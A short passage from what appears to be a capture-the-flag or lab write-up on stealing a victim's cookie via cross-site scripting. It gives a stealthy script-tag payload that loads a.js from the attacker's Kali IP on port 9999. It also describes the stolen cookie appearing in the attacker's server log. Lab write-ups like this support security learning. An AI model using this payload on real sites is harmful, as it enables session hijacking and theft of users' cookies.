...
We won't need to spend much time on this one. All we need to do is specify a source file (which we'll call "a.js") in the XSS exploit. And to stay stealthy, we won't cause a visible <b>alert</b> anymore. Here's what we get:

<b>&#60;script src="http://</b>[your_Kali_IP]<b>:9999/a.js"&#62;&#60;/script&#62;</b>
...
<ol type="1">
  ...
  <li>A 404 response code, showing that we couldn't access a file; and </li>
  <li>The actual request made, which has our cookie! Remember I truncated my cookie output as before.</li>
</ol>

Now as long as we have our webserver, we can adjust our exploit to point to its IP. Then we can get our victim's cookie from anywhere. Challenge complete!
